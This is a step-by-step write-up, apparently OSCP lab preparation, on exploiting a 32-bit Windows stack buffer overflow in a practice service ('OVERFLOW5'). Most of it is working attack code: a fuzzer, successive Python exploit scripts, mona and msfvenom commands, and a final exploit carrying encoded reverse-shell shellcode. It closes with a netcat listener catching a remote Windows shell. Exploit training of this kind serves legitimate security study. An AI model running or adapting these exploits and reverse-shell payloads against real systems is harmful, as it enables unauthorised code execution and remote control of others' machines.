# Buffer Overflow
*Exploiting windows 32bit buffer overflows*

---

# Concepts

Bufferoverflow Concept [https://www.youtube.com/watch?v=1S0aBV-Waeo](https://www.youtube.com/watch?v=1S0aBV-Waeo)

Basics of Exploit writing [https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

# Setting up the debugger

Download immunity debugger [https://www.immunityinc.com/products/debugger/](https://www.immunityinc.com/products/debugger/)

Mona is a powerful plugin for immunity debugger that makes exploiting buffer overflows much easier. Download Mona here: [https://github.com/corelan/mona](https://github.com/corelan/mona)

Mona Manual: [https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

## Setting up mona:
```
!mona config -set working folder c:\users\username\desktop\mona\%p
```
This will be the path of  saved mona files later..


## Basic Mona commands:

Finding the offset
```
!mona findmsp -distance <buffer>
```
Finding the badchars
```
!mona bytearray -b "\x00" + <badchars>
```
Comparing badchars on mona
```
!mona compare -f C:\users\username\desktop\mona\bytearray.bin -a <ESPaddress>
```
Finding a jump point
```
!mona jump -r esp -cbp "\x00"+<other_badchars>
```


# Fuzz the target

Fuzz testing is the process of finding security vulnerabilities in input-parsing code. We will fuzz remote entry points to an application as this will send increasingly long buffer strings.. Our main goal is to crash the application and see if it vulnerable to buffer overflow

*exploit.py*
```python
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

payload = b'OVERFLOW5 ' + b'A' * 500

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(payload)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```

We can start as much as 100 bytes to 500 bytes.. and we can increase it by 500, until the application crashes and overwrite the EIP. Create a fuzzer script.

*fuzzer.py*
```python
#!/usr/bin/python3

import sys, socket
from time import sleep

host = '10.10.142.189'
port = 1337

function = b'OVERFLOW5 '


def fuzzer(host, port):

        payload = b''

        while True:
                try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.connect((host, port))
					s.send(function + payload)
					sleep(.25)
					payload += b'A' * 100
					print("fuzzing at %s bytes.." % str(len(payload)))

                except Exception as err:
					print(err)
					print("fuzzer crashed. -> %s bytes.." % str(len(payload)))
					sys.exit()


if __name__ == '__main__':
        fuzzer(host, port)
```

Run the fuzzer
```
$ ./fuzzer.py 
fuzzing at 100 bytes..
fuzzing at 200 bytes..
fuzzing at 300 bytes..
fuzzing at 400 bytes..
fuzzing at 500 bytes..
fuzzing at 600 bytes..
fuzzing at 700 bytes..
fuzzing at 800 bytes..
fuzzing at 900 bytes..
fuzzing at 1000 bytes..
^CTraceback (most recent call last):
  File "./fuzzer.py", line 32, in <module>
    fuzzer(host, port)
  File "./fuzzer.py", line 19, in fuzzer
    s.connect((host, port))
KeyboardInterrupt
```

![fuzz.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/fuzz.png)

After fuzzing and the application crashed, we can use a pattern on our kali linux.

# Creating a pattern

```shell
$ `locate pattern_create.rb` -l 1000
```
Modify the script and pass the pattern to the vulnerable application instead of the A's

*exploit.py*
```python
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'


function = b'OVERFLOW5 '
payload = b'A' * 3000

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(function + pattern)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```

# Getting the Offset

After executing the script, the application should crash and get the EIP. This will be used to get our offset.

![get_eip.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/get_eip.png)

locate the offset by using mona or mestasploit's pattern_offset.rb.

Pattern Offset
```shell
$ `locate pattern_offset.rb` -l 1000 -q 356B4134

[*] Exact match at offset 314
```
Mona
```
!mona findmsp -distance 1000
```

![mona_offset.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/mona_offset.png)

After getting the offset, pass 4 bytes of "B" character to know that we overwritten the instruction pointer (EIP) with 42424242. Modify the script again as follows.

# Controlling EIP

*exploit.py*
```python
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

# [*] Exact match at offset 314

function = b'OVERFLOW5 '
payload = b'A' * 314 + b'B' * 4

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(function + payload)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```

After executing the script.. 4 bytes of B's.. we control the EIP. 

![eip_overwritten_42.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/eip_overwritten_42.png)

Since the EIP is now on our control, we can remove the bad chars to ensure that the shellcode will not be terminated. Any badchars including null byte will terminate our malicous code. Generate badchars, exclude the nullbyte "\x00" and include it on the script.

# Removing Badchars

Python shell
```shell
Python 3.8.6 (default, Sep 25 2020, 09:36:53) 
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> for x in range(1,256):
...     print("\\x" + "{:02x}".format(x), end='')
... 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff>>>
```

*exploit.py*
```python
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

# [*] Exact match at offset 314

badchars = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

function = b'OVERFLOW5 '
payload = b'A' * 314 + b'B' * 4 + badchars

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(function + payload)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```
Before exploiting, remove the nullbyte and generate it on mona so we can compare later.
```
!mona bytearray -b "\x00"
```

Execute the script. After executing, follow the hexdump of stack pointer (ESP).

![follow_hexdump.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/follow_hexdump.png)

There a couple of badcharacters.. a string terminator. If our exploit code falls off on badchars like this, it will be terminated. Goal is to remove the badcharacters. We can easly spot them using mona.

```
!mona compare -f c:\users\admin\desktop\oscp\bytearray.bin -a 0198FA30
```

![mona_compare.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/mona_compare.png)

We got all of the badchars. Remove them now on our shellcode. And compare again.
You may remove it one by one to ensure that the correct badchars are omitted.

*exploit.py*
```python
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

# [*] Exact match at offset 314
# Badchars: 00 16 17 2f 30 f4 f5 fd
# Removed: 00 16 2f f4 fd

badchars = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff'

function = b'OVERFLOW5 '
payload = b'A' * 314 + b'B' * 4 + badchars

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(function + payload)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```

Before executing the script, prepare a bytearray on mona with the badchars. Compare it again. Once the badchars are removed, its time for exploitation.

```
!mona bytearray -b "\x00\x16\x2f\xf4\xfd"
```
![mona_no_badchars.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/mona_no_badchars.png)

```
!mona compare -f c:\user\admin\desktop\oscp\bytearray.bin -a 019BFA30
```

# Jump to a shell code

We can jump to a shellcode in a reliable way instead on directly to the EIP. If it contains a nullbyte or badchars, it will just terminate our shellcode. Lets find a return address, to jump on our shellcode.

Mona (while on crashed state)
```
mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"
```

Click the View -> Log, if it doesnt show. We can see the ESP return addresses. We can use it to leverage and jump to our shellcode. Take note of the memory addresses available.

![jmp_esp.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/jmp_esp.png)

Modify the the script again and put the jmp esp. Note that x86 is little endian so address must be put in backwards. (625011af -> \xaf\x11\x50\x62) replace the 4 bytes we put on the EIP, and put the return address, to redirect it to our shellcode.

*exploit.py*
```python3
#!/usr/bin/python3

import sys, socket

host = '10.10.142.189'
port = 1337

# [*] Exact match at offset 314
# Badchars: 00 16 17 2f 30 f4 f5 fd
# Removed: 00 16 2f f4 fd
# jmp esp register: 0x625011af

badchars = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff'

function = b'OVERFLOW5 '
jmp_esp = b'\xaf\x11\x50\x62'
payload = b'A' * 314 + jmp_esp

def exploit():

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((host, port))
                s.send(function + payload)

                s.close()

        except KeyboardInterrupt:
                print("Terminated..")
                sys.exit()

        except Exception as err:
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':
        exploit()
```

Our exploitation is still incomplete, we need to include the malicious reverse shell code.

# Exploitation

Generate a msf payload reverse shell and we need to remove the badchars.
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=443 EXITFUNC=thread -f py -a x86 -b "\x00\x16\x2f\xf4\xfd"
```

Spawn a listener to catch our reverse shell
```shell
sudo rlwrap nc -lvnp 443

listening on [any] 443 ...
```

Sum up our exploit before we execute:

*exploit.py*
```python3
#!/usr/bin/python3                                                                                                                                                      [26/1723]
                                            
import sys, socket                          
                                            
host = '10.10.142.189'                      
port = 1337                                                                             

# [*] Exact match at offset 314             
# Badchars: 00 16 17 2f 30 f4 f5 fd         
# Removed: 00 16 2f f4 fd                   
# jmp esp register: 0x625011af                                                          

badchars = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a
\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\
x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x
84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb
0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc
\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff'
                                            
buf =  b""                                  
buf += b"\xfc\xbb\x3e\x6d\x87\x4f\xeb\x0c\x5e\x56\x31\x1e\xad"                          
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xc2"                          
buf += b"\x85\x05\x4f\x3a\x56\x6a\xd9\xdf\x67\xaa\xbd\x94\xd8"                                                                                                                   
buf += b"\x1a\xb5\xf8\xd4\xd1\x9b\xe8\x6f\x97\x33\x1f\xc7\x12"                          
buf += b"\x62\x2e\xd8\x0f\x56\x31\x5a\x52\x8b\x91\x63\x9d\xde"                          
buf += b"\xd0\xa4\xc0\x13\x80\x7d\x8e\x86\x34\x09\xda\x1a\xbf"                          
buf += b"\x41\xca\x1a\x5c\x11\xed\x0b\xf3\x29\xb4\x8b\xf2\xfe"                          
buf += b"\xcc\x85\xec\xe3\xe9\x5c\x87\xd0\x86\x5e\x41\x29\x66"                                                                                                                   
buf += b"\xcc\xac\x85\x95\x0c\xe9\x22\x46\x7b\x03\x51\xfb\x7c"                          
buf += b"\xd0\x2b\x27\x08\xc2\x8c\xac\xaa\x2e\x2c\x60\x2c\xa5"                          
buf += b"\x22\xcd\x3a\xe1\x26\xd0\xef\x9a\x53\x59\x0e\x4c\xd2"                          
buf += b"\x19\x35\x48\xbe\xfa\x54\xc9\x1a\xac\x69\x09\xc5\x11"                          
buf += b"\xcc\x42\xe8\x46\x7d\x09\x65\xaa\x4c\xb1\x75\xa4\xc7"                          
buf += b"\xc2\x47\x6b\x7c\x4c\xe4\xe4\x5a\x8b\x0b\xdf\x1b\x03"                          
buf += b"\xf2\xe0\x5b\x0a\x31\xb4\x0b\x24\x90\xb5\xc7\xb4\x1d"                          
buf += b"\x60\x47\xe4\xb1\xdb\x28\x54\x72\x8c\xc0\xbe\x7d\xf3"                          
buf += b"\xf1\xc1\x57\x9c\x98\x38\x30\xa9\x57\x51\x99\xc5\x65"                          
buf += b"\x55\x18\xad\xe3\xb3\x70\xc1\xa5\x6c\xed\x78\xec\xe6"                          
buf += b"\x8c\x85\x3a\x83\x8f\x0e\xc9\x74\x41\xe7\xa4\x66\x36"                          
buf += b"\x07\xf3\xd4\x91\x18\x29\x70\x7d\x8a\xb6\x80\x08\xb7"                          
buf += b"\x60\xd7\x5d\x09\x79\xbd\x73\x30\xd3\xa3\x89\xa4\x1c"                          
buf += b"\x67\x56\x15\xa2\x66\x1b\x21\x80\x78\xe5\xaa\x8c\x2c"                          
buf += b"\xb9\xfc\x5a\x9a\x7f\x57\x2d\x74\xd6\x04\xe7\x10\xaf"                          
buf += b"\x66\x38\x66\xb0\xa2\xce\x86\x01\x1b\x97\xb9\xae\xcb"                          
buf += b"\x1f\xc2\xd2\x6b\xdf\x19\x57\x8b\x02\x8b\xa2\x24\x9b"                          
buf += b"\x5e\x0f\x29\x1c\xb5\x4c\x54\x9f\x3f\x2d\xa3\xbf\x4a"                          
buf += b"\x28\xef\x07\xa7\x40\x60\xe2\xc7\xf7\x81\x27\xc7\xf7"                          
buf += b"\x7d\xc8"                          

shellcode = buf

function = b'OVERFLOW5 '                    
jmp_esp = b'\xaf\x11\x50\x62'               
payload = b'A' * 314 + jmp_esp + shellcode                           

def exploit():                          
                                                                                
        try:                                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                   

                s.connect((host, port))
                s.send(function + payload)                                              
                                        
                s.close()                   
                                        
        except KeyboardInterrupt:                                               
                print("Terminated..")       
                sys.exit()                  
                                        
        except Exception as err:            
                print("%s\nError.. Unable to connect to server:%s:%s" % (err, host, port))

if __name__ == '__main__':                  
        exploit()
```

# Summary

Sending the exploit shellcode to the program to parse, note that we get the exact offset of the program send a bunch of AAAA's and overwrite the EIP with the ESP address, to jump into our shellcode.

We can use to fill nop sleds to slide down to our shellcode and avoid null terminators, in case our exploit will not work. starting from 8 bytes. multiple of 8.

After executing the script.. we should get a shell.

```
sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.19.89] from (UNKNOWN) [10.10.142.189] 49286
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop\vulnerable-apps\oscp>hostname
hostname
oscp-bof-prep

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

![windows_shell.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/windows_shell.png)
